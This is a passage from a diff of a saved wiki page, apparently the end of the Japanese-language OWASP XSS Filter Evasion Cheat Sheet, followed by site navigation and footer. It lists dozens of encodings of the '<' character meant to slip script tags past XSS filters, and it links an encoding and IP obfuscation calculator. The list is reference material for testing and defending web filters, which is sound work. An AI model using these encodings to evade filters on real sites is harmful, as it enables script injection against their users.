+<p>HTML と JavaScript における文字 "<" のすべての可能な組み合わせです。これらの多くは、標準設定のままでは、レンダリングすることはできません。多くは前述のような特定の条件下でレンダリング可能になります。
+</p>
+<pre>&lt;
+%3C
+&amp;lt
+&amp;lt;
+&amp;LT
+&amp;LT;
+&amp;#60
+&amp;#060
+&amp;#0060
+&amp;#00060
+&amp;#000060
+&amp;#0000060
+&amp;#60;
+&amp;#060;
+&amp;#0060;
+&amp;#00060;
+&amp;#000060;
+&amp;#0000060;
+&amp;#x3c
+&amp;#x03c
+&amp;#x003c
+&amp;#x0003c
+&amp;#x00003c
+&amp;#x000003c
+&amp;#x3c;
+&amp;#x03c;
+&amp;#x003c;
+&amp;#x0003c;
+&amp;#x00003c;
+&amp;#x000003c;
+&amp;#X3c
+&amp;#X03c
+&amp;#X003c
+&amp;#X0003c
+&amp;#X00003c
+&amp;#X000003c
+&amp;#X3c;
+&amp;#X03c;
+&amp;#X003c;
+&amp;#X0003c;
+&amp;#X00003c;
+&amp;#X000003c;
+&amp;#x3C
+&amp;#x03C
+&amp;#x003C
+&amp;#x0003C
+&amp;#x00003C
+&amp;#x000003C
+&amp;#x3C;
+&amp;#x03C;
+&amp;#x003C;
+&amp;#x0003C;
+&amp;#x00003C;
+&amp;#x000003C;
+&amp;#X3C
+&amp;#X03C
+&amp;#X003C
+&amp;#X0003C
+&amp;#X00003C
+&amp;#X000003C
+&amp;#X3C;
+&amp;#X03C;
+&amp;#X003C;
+&amp;#X0003C;
+&amp;#X00003C;
+&amp;#X000003C;
+\x3c
+\x3C
+\u003c
+\u003C
+</pre>
+<h1><span class="mw-headline" id="Character_Encoding_and_IP_Obfuscation_Calculators">文字エンコードおよび IP 難読化計算機能</span></h1>
+<p>次のリンクには、XSS で役立つ基本的な変換機能のための計算機能が含まれています。
+</p><p><a rel="nofollow" class="external free" href="http://ha.ckers.org/xsscalc.html">http://ha.ckers.org/xsscalc.html</a>
+</p>
+<h1><span class="mw-headline" id="Authors_and_Primary_Editors">Authors and Primary Editors</span></h1>
+<p>Robert "RSnake" Hansen
+</p>
+<h1><span class="mw-headline" id="Other_Cheatsheets">Other Cheatsheets</span></h1>
+<p><b>Developer Cheat Sheets (Builder)</b>
+</p>
+<ul>
+<li> <a href="/index.php/Authentication_Cheat_Sheet" title="Authentication Cheat Sheet">Authentication Cheat Sheet</a> (<a href="/index.php/Authentication_Cheat_Sheet_Espa%C3%B1ol" title="Authentication Cheat Sheet Español">Spanish</a>)
+</li>
+<li> <a href="/index.php/Choosing_and_Using_Security_Questions_Cheat_Sheet" title="Choosing and Using Security Questions Cheat Sheet">Choosing and Using Security Questions Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Clickjacking_Defense_Cheat_Sheet" title="Clickjacking Defense Cheat Sheet">Clickjacking Defense Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/C-Based_Toolchain_Hardening_Cheat_Sheet" title="C-Based Toolchain Hardening Cheat Sheet">C-Based Toolchain Hardening Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet" title="Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet">Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Cryptographic_Storage_Cheat_Sheet" title="Cryptographic Storage Cheat Sheet">Cryptographic Storage Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/DOM_based_XSS_Prevention_Cheat_Sheet" title="DOM based XSS Prevention Cheat Sheet">DOM based XSS Prevention Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Forgot_Password_Cheat_Sheet" title="Forgot Password Cheat Sheet">Forgot Password Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/HTML5_Security_Cheat_Sheet" title="HTML5 Security Cheat Sheet">HTML5 Security Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Input_Validation_Cheat_Sheet" title="Input Validation Cheat Sheet">Input Validation Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/JAAS_Cheat_Sheet" title="JAAS Cheat Sheet">JAAS Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Logging_Cheat_Sheet" title="Logging Cheat Sheet">Logging Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/.NET_Security_Cheat_Sheet" title=".NET Security Cheat Sheet">.NET Security Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/OWASP_Top_Ten_Cheat_Sheet" title="OWASP Top Ten Cheat Sheet">OWASP Top Ten Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Password_Storage_Cheat_Sheet" title="Password Storage Cheat Sheet">Password Storage Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Pinning_Cheat_Sheet" title="Pinning Cheat Sheet">Pinning Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Query_Parameterization_Cheat_Sheet" title="Query Parameterization Cheat Sheet">Query Parameterization Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Ruby_on_Rails_Cheatsheet" title="Ruby on Rails Cheatsheet">Ruby on Rails Cheatsheet</a>
+</li>
+<li> <a href="/index.php/REST_Security_Cheat_Sheet" title="REST Security Cheat Sheet">REST Security Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Session_Management_Cheat_Sheet" title="Session Management Cheat Sheet">Session Management Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/SAML_Security_Cheat_Sheet" title="SAML Security Cheat Sheet">SAML Security Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/SQL_Injection_Prevention_Cheat_Sheet" title="SQL Injection Prevention Cheat Sheet">SQL Injection Prevention Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Transaction_Authorization_Cheat_Sheet" title="Transaction Authorization Cheat Sheet">Transaction Authorization Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Transport_Layer_Protection_Cheat_Sheet" title="Transport Layer Protection Cheat Sheet">Transport Layer Protection Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet" title="Unvalidated Redirects and Forwards Cheat Sheet">Unvalidated Redirects and Forwards Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/User_Privacy_Protection_Cheat_Sheet" title="User Privacy Protection Cheat Sheet">User Privacy Protection Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Web_Service_Security_Cheat_Sheet" title="Web Service Security Cheat Sheet">Web Service Security Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet" title="XSS (Cross Site Scripting) Prevention Cheat Sheet">XSS (Cross Site Scripting) Prevention Cheat Sheet</a>
+</li>
+</ul>
+<p><b>Assessment Cheat Sheets (Breaker)</b>
+</p>
+<ul>
+<li> <a href="/index.php/Attack_Surface_Analysis_Cheat_Sheet" title="Attack Surface Analysis Cheat Sheet">Attack Surface Analysis Cheat Sheet</a>
+</li>
+<li> <strong class="selflink">XSS Filter Evasion Cheat Sheet</strong>
+</li>
+<li> <a href="/index.php/REST_Assessment_Cheat_Sheet" title="REST Assessment Cheat Sheet">REST Assessment Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Web_Application_Security_Testing_Cheat_Sheet" title="Web Application Security Testing Cheat Sheet">Web Application Security Testing Cheat Sheet</a>
+</li>
+</ul>
+<p><b>Mobile Cheat Sheets</b>
+</p>
+<ul>
+<li> <a href="/index.php/IOS_Developer_Cheat_Sheet" title="IOS Developer Cheat Sheet">IOS Developer Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Mobile_Jailbreaking_Cheat_Sheet" title="Mobile Jailbreaking Cheat Sheet">Mobile Jailbreaking Cheat Sheet</a>
+</li>
+</ul>
+<p><b>OpSec Cheat Sheets (Defender)</b>
+</p>
+<ul>
+<li> <a href="/index.php/Virtual_Patching_Cheat_Sheet" title="Virtual Patching Cheat Sheet">Virtual Patching Cheat Sheet</a>
+</li>
+</ul>
+<p><b>Draft Cheat Sheets</b>
+</p>
+<ul>
+<li> <a href="/index.php/Access_Control_Cheat_Sheet" title="Access Control Cheat Sheet">Access Control Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Application_Security_Architecture_Cheat_Sheet" title="Application Security Architecture Cheat Sheet">Application Security Architecture Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Business_Logic_Security_Cheat_Sheet" title="Business Logic Security Cheat Sheet">Business Logic Security Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/PHP_Security_Cheat_Sheet" title="PHP Security Cheat Sheet">PHP Security Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Secure_Coding_Cheat_Sheet" title="Secure Coding Cheat Sheet">Secure Coding Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Secure_SDLC_Cheat_Sheet" title="Secure SDLC Cheat Sheet">Secure SDLC Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Threat_Modeling_Cheat_Sheet" title="Threat Modeling Cheat Sheet">Threat Modeling Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Grails_Secure_Code_Review_Cheat_Sheet" title="Grails Secure Code Review Cheat Sheet">Grails Secure Code Review Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/IOS_Application_Security_Testing_Cheat_Sheet" title="IOS Application Security Testing Cheat Sheet">IOS Application Security Testing Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Key_Management_Cheat_Sheet" title="Key Management Cheat Sheet">Key Management Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet" title="Insecure Direct Object Reference Prevention Cheat Sheet">Insecure Direct Object Reference Prevention Cheat Sheet</a>
+</li>
+<li> <a href="/index.php/Content_Security_Policy_Cheat_Sheet" title="Content Security Policy Cheat Sheet">Content Security Policy Cheat Sheet</a>
+</li>
+</ul>
+<p>
+</p>
+<!-- 
+NewPP limit report
+CPU time usage: 0.195 seconds
+Real time usage: 0.206 seconds
+Preprocessor visited node count: 1163/1000000
+Preprocessor generated node count: 2074/1000000
+Post‐expand include size: 2085/2097152 bytes
+Template argument size: 0/2097152 bytes
+Highest expansion depth: 2/40
+Expensive parser function count: 0/100
+-->
+
+<!-- Saved in parser cache with key wiki:pcache:idhash:26566-0!*!0!!en!2!* and timestamp 20151215040010 and revision id 202050
+ -->
+</div>								<div class="printfooter">
+				Retrieved from "<a href="https://www.owasp.org/index.php?title=XSS_Filter_Evasion_Cheat_Sheet&amp;oldid=202050">https://www.owasp.org/index.php?title=XSS_Filter_Evasion_Cheat_Sheet&amp;oldid=202050</a>"				</div>
+												<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="/index.php/Special:Categories" title="Special:Categories">Categories</a>: <ul><li><a href="/index.php/Category:Cheatsheets" title="Category:Cheatsheets">Cheatsheets</a></li><li><a href="/index.php/Category:Popular" title="Category:Popular">Popular</a></li><li><a href="/index.php/Category:OWASP_Breakers" title="Category:OWASP Breakers">OWASP Breakers</a></li></ul></div></div>												<div class="visualClear"></div>
+							</div>
+		</div>
+		<div id="mw-navigation">
+			<h2>Navigation menu</h2>
+			<div id="mw-head">
+				<div id="p-personal" role="navigation" class="" aria-labelledby="p-personal-label">
+	<h3 id="p-personal-label">Personal tools</h3>
+	<ul>
+<li id="pt-login"><a href="/index.php?title=Special:UserLogin&amp;returnto=XSS+Filter+Evasion+Cheat+Sheet" title="You are encouraged to log in; however, it is not mandatory [o]" accesskey="o">Log in</a></li><li id="pt-createaccount"><a href="/index.php/Special:RequestAccount">Request account</a></li>	</ul>
+</div>
+				<div id="left-navigation">
+					<div id="p-namespaces" role="navigation" class="vectorTabs" aria-labelledby="p-namespaces-label">
+	<h3 id="p-namespaces-label">Namespaces</h3>
+	<ul>
+					<li  id="ca-nstab-main" class="selected"><span><a href="/index.php/XSS_Filter_Evasion_Cheat_Sheet"  title="View the content page [c]" accesskey="c">Page</a></span></li>
+					<li  id="ca-talk"><span><a href="/index.php/Talk:XSS_Filter_Evasion_Cheat_Sheet"  title="Discussion about the content page [t]" accesskey="t">Discussion</a></span></li>
+			</ul>
+</div>
+<div id="p-variants" role="navigation" class="vectorMenu emptyPortlet" aria-labelledby="p-variants-label">
+	<h3 id="mw-vector-current-variant">
+		</h3>
+	<h3 id="p-variants-label"><span>Variants</span><a href="#"></a></h3>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+				</div>
+				<div id="right-navigation">
+					<div id="p-views" role="navigation" class="vectorTabs" aria-labelledby="p-views-label">
+	<h3 id="p-views-label">Views</h3>
+	<ul>
+					<li id="ca-view" class="selected"><span><a href="/index.php/XSS_Filter_Evasion_Cheat_Sheet" >Read</a></span></li>
+					<li id="ca-viewsource"><span><a href="/index.php?title=XSS_Filter_Evasion_Cheat_Sheet&amp;action=edit"  title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></span></li>
+					<li id="ca-history" class="collapsible"><span><a href="/index.php?title=XSS_Filter_Evasion_Cheat_Sheet&amp;action=history"  title="Past revisions of this page [h]" accesskey="h">View history</a></span></li>
+			</ul>
+</div>
+<div id="p-cactions" role="navigation" class="vectorMenu emptyPortlet" aria-labelledby="p-cactions-label">
+	<h3 id="p-cactions-label"><span>Actions</span><a href="#"></a></h3>
+	<div class="menu">
+		<ul>
+					</ul>
+	</div>
+</div>
+<div id="p-search" role="search">
+	<h3><label for="searchInput">Search</label></h3>
+	<form action="/index.php" id="searchform">
+					<div id="simpleSearch">
+					<input type="search" name="search" placeholder="Search" title="Search OWASP [f]" accesskey="f" id="searchInput" /><input type="hidden" value="Special:Search" name="title" /><input type="submit" name="fulltext" value="Search" title="Search the pages for this text" id="mw-searchButton" class="searchButton mw-fallbackSearchButton" /><input type="submit" name="go" value="Go" title="Go to a page with this exact name if exists" id="searchButton" class="searchButton" />		</div>
+	</form>
+</div>
+				</div>
+			</div>
+			<div id="mw-panel">
+					<div id="p-logo" role="banner"><a style="background-image: url(/skins/owasplogo.png);" href="/index.php/Main_Page"  title="Visit the main page"></a></div>
+				<div class="portal" role="navigation" id='p-Navigation' aria-labelledby='p-Navigation-label'>
+	<h3 id='p-Navigation-label'>Navigation</h3>
+	<div class="body">
+		<ul>
+			<li id="n-Home"><a href="/index.php/Main_Page">Home</a></li>
+			<li id="n-About-OWASP"><a href="/index.php/About_OWASP">About OWASP</a></li>
+			<li id="n-Acknowledgements"><a href="https://www.owasp.org/index.php/Acknowledgements" rel="nofollow">Acknowledgements</a></li>
+			<li id="n-Advertising"><a href="https://www.owasp.org/index.php/Advertising" rel="nofollow">Advertising</a></li>
+			<li id="n-AppSec-Events"><a href="/index.php/Category:OWASP_AppSec_Conference">AppSec Events</a></li>
+			<li id="n-Books"><a href="http://stores.lulu.com/owasp" rel="nofollow">Books</a></li>
+			<li id="n-Brand-Resources"><a href="https://www.owasp.org/index.php/Marketing/Resources" rel="nofollow">Brand Resources</a></li>
+			<li id="n-Chapters"><a href="https://www.owasp.org/index.php/OWASP_Chapter" rel="nofollow">Chapters</a></li>
+			<li id="n-Donate-to-OWASP"><a href="https://www.owasp.org/index.php/Donate" rel="nofollow">Donate to OWASP</a></li>
+			<li id="n-Downloads"><a href="/index.php/Category:OWASP_Download">Downloads</a></li>
+			<li id="n-Funding"><a href="https://www.owasp.org/index.php/Funding" rel="nofollow">Funding</a></li>
+			<li id="n-Governance"><a href="https://www.owasp.org/index.php/Governance" rel="nofollow">Governance</a></li>
+			<li id="n-Initiatives"><a href="https://www.owasp.org/index.php/OWASP_Initiatives_Global_Strategic_Focus" rel="nofollow">Initiatives</a></li>
+			<li id="n-Mailing-Lists"><a href="http://lists.owasp.org/mailman/listinfo" rel="nofollow">Mailing Lists</a></li>
+			<li id="n-Membership"><a href="/index.php/Membership">Membership</a></li>
+			<li id="n-Merchandise"><a href="https://www.owasp.org/index.php/OWASP_Merchandise" rel="nofollow">Merchandise</a></li>
+			<li id="n-News"><a href="/index.php/Application_Security_News">News</a></li>
+			<li id="n-Portal"><a href="https://www.owasp.org/index.php/Portal" rel="nofollow" title="About the project, what you can do, where to find things">Community portal</a></li>
+			<li id="n-Presentations"><a href="/index.php/Category:OWASP_Presentations">Presentations</a></li>
+			<li id="n-Press"><a href="https://www.owasp.org/index.php/Press" rel="nofollow">Press</a></li>
+			<li id="n-Projects"><a href="/index.php/Category:OWASP_Project">Projects</a></li>
+			<li id="n-Video"><a href="/index.php/Category:OWASP_Video">Video</a></li>
+			<li id="n-Volunteer"><a href="http://owasp.force.com/volunteers/GW_Volunteers__VolunteersJobListing" rel="nofollow">Volunteer</a></li>
+		</ul>
+	</div>
+</div>
+<div class="portal" role="navigation" id='p-Reference' aria-labelledby='p-Reference-label'>
+	<h3 id='p-Reference-label'>Reference</h3>
+	<div class="body">
+		<ul>
+			<li id="n-Activities"><a href="/index.php/Category:Activity">Activities</a></li>
+			<li id="n-Attacks"><a href="/index.php/Category:Attack">Attacks</a></li>
+			<li id="n-Code-Snippets"><a href="/index.php/Category:Code_Snippet">Code Snippets</a></li>
+			<li id="n-Controls"><a href="/index.php/Category:Control">Controls</a></li>
+			<li id="n-Glossary"><a href="/index.php/Category:Glossary">Glossary</a></li>
+			<li id="n-How-To..."><a href="/index.php/Category:How_To">How To...</a></li>
+			<li id="n-Java-Project"><a href="/index.php/Category:OWASP_Java_Project">Java Project</a></li>
+			<li id="n-.NET-Project"><a href="/index.php/Category:OWASP_.NET_Project">.NET Project</a></li>
+			<li id="n-Principles"><a href="/index.php/Category:Principle">Principles</a></li>
+			<li id="n-Technologies"><a href="/index.php/Category:Technology">Technologies</a></li>
+			<li id="n-Threat-Agents"><a href="/index.php/Category:Threat_Agent">Threat Agents</a></li>
+			<li id="n-Vulnerabilities"><a href="/index.php/Category:Vulnerability">Vulnerabilities</a></li>
+		</ul>
+	</div>
+</div>
+<div class="portal" role="navigation" id='p-languageselector' aria-labelledby='p-languageselector-label'>
+	<h3 id='p-languageselector-label'>Language</h3>
+	<div class="body">
+		<ul>
+			<li id="n-languageselector" class="active"><a 0="https://www.owasp.org/index.php?title=XSS_Filter_Evasion_Cheat_Sheet&amp;setlang=en" href="https://www.owasp.org/index.php?title=XSS_Filter_Evasion_Cheat_Sheet&amp;setlang=en">English</a></li>
+			<li id="n-languageselector"><a 0="https://www.owasp.org/index.php?title=XSS_Filter_Evasion_Cheat_Sheet&amp;setlang=es" href="https://www.owasp.org/index.php?title=XSS_Filter_Evasion_Cheat_Sheet&amp;setlang=es">español</a></li>
+		</ul>
+	</div>
+</div>
+<div class="portal" role="navigation" id='p-tb' aria-labelledby='p-tb-label'>
+	<h3 id='p-tb-label'>Tools</h3>
+	<div class="body">
+		<ul>
+			<li id="t-whatlinkshere"><a href="/index.php/Special:WhatLinksHere/XSS_Filter_Evasion_Cheat_Sheet" title="A list of all wiki pages that link here [j]" accesskey="j">What links here</a></li>
+			<li id="t-recentchangeslinked"><a href="/index.php/Special:RecentChangesLinked/XSS_Filter_Evasion_Cheat_Sheet" title="Recent changes in pages linked from this page [k]" accesskey="k">Related changes</a></li>
+			<li id="t-specialpages"><a href="/index.php/Special:SpecialPages" title="A list of all special pages [q]" accesskey="q">Special pages</a></li>
+			<li id="t-print"><a href="/index.php?title=XSS_Filter_Evasion_Cheat_Sheet&amp;printable=yes" rel="alternate" title="Printable version of this page [p]" accesskey="p">Printable version</a></li>
+			<li id="t-permalink"><a href="/index.php?title=XSS_Filter_Evasion_Cheat_Sheet&amp;oldid=202050" title="Permanent link to this revision of the page">Permanent link</a></li>
+			<li id="t-info"><a href="/index.php?title=XSS_Filter_Evasion_Cheat_Sheet&amp;action=info">Page information</a></li>
+		</ul>
+	</div>
+</div>
+			</div>
+		</div>
+		<div id="footer" role="contentinfo">
+							<ul id="footer-info">
+											<li id="footer-info-lastmod"> This page was last modified on 12 October 2015, at 12:43.</li>
+											<li id="footer-info-viewcount">This page has been accessed 1,968,141 times.</li>
+											<li id="footer-info-copyright">Content is available under <a class="external" rel="nofollow" href="http://creativecommons.org/licenses/by-sa/3.0/">a Creative Commons 3.0 License</a> unless otherwise noted.</li>
+									</ul>
+							<ul id="footer-places">
+											<li id="footer-places-privacy"><a href="/index.php/OWASP:Privacy_policy" title="OWASP:Privacy policy">Privacy policy</a></li>
+											<li id="footer-places-about"><a href="/index.php/OWASP:About" title="OWASP:About">About OWASP</a></li>
+											<li id="footer-places-disclaimer"><a href="/index.php/OWASP:General_disclaimer" title="OWASP:General disclaimer">Disclaimers</a></li>
+									</ul>
+										<ul id="footer-icons" class="noprint">
+					<li id="footer-copyrightico">
+						<a href="http://creativecommons.org/licenses/by-sa/3.0/"><img src="https://www.owasp.org/images/f/fa/Somerights20.png" alt="a Creative Commons 3.0 License" width="88" height="31" /></a>
+					</li>
+					<li id="footer-poweredbyico">
+						<a href="//www.mediawiki.org/"><img src="/skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
+						<a href="http://www.rackspace.com/cloud/managed_cloud/"><img src="/images/Powered_By_Rackspace_logo.png" alt="Powered by Rackspace Managed Cloud" height="30" width="100" /></a>
+					</li>
+				</ul>
+						<div style="clear:both"></div>
+		</div>
+		<script>/*<![CDATA[*/window.jQuery && jQuery.ready();/*]]>*/</script><script>if(window.mw){
+mw.loader.state({"site":"loading","user":"ready","user.groups":"ready"});
+}</script>
+<script>if(window.mw){
+mw.loader.load(["mediawiki.action.view.postEdit","mediawiki.user","mediawiki.hidpi","mediawiki.page.ready","mediawiki.searchSuggest","ext.languageSelector","ext.headertabs","skins.vector.collapsibleNav"],null,true);
+}</script>
+<script type="text/javascript">
+function buildContent (blog) {
+    var MONTH_NAMES = [ "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec" ];
+    if (!blog || !blog.items) return;  var container=document.getElementById("container");
+    var code="";  for (var i = 0; i < blog.items.length; i++) {   var item = blog.items[i];
+    var date = new Date();    date.setTime( 4 + item.published * 1000 );
+    var datestring = MONTH_NAMES[date.getMonth()]+" "+(date.getDate());
+    code=code+"<div style='font-weight:bold'>"+datestring+" - ";    
+    code=code+"<a href='"+item.alternate.href+"'>"+item.title+"</a> (by ";
+    code=code+"<a href='"+item.origin.streamId.substring(5)+"'>"+item.author+"</a>)</div>";
+    var text=""+item.content;
+    if (text == "undefined" ) {
+	  text=item.summary;
+    }
+    code=code+"<div>"+text+"</div><br>";
+    }
+    container.innerHTML=code;
+}
+</script> 
+<script type="text/javascript">
+function build_bloglist(data) {
+  var container = document.getElementById('blogroll');
+  var list = document.createElement('div');
+  // Loop through all data items returned
+  for (var i=0; i < data.items.length; i++) {
+    var item = data.items[i];
+		var link = document.createElement('a');
+		link.appendChild(document.createTextNode(item.title));
+	link.href = item.id;
+    list.appendChild(link);
+    list.appendChild(document.createElement('br'));
+  }
+  container.appendChild(list);
+}
+</script>
+<script src="https://www.owasp.org/load.php?debug=false&amp;lang=en&amp;modules=site&amp;only=scripts&amp;skin=vector&amp;*"></script>
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try {
+var pageTracker = _gat._getTracker("UA-4531126-1");
+pageTracker._trackPageview();
+} catch(err) {}
+</script><script>if(window.mw){
+mw.config.set({"wgBackendResponseTime":174});
+}</script>
+	</body>
+</html>
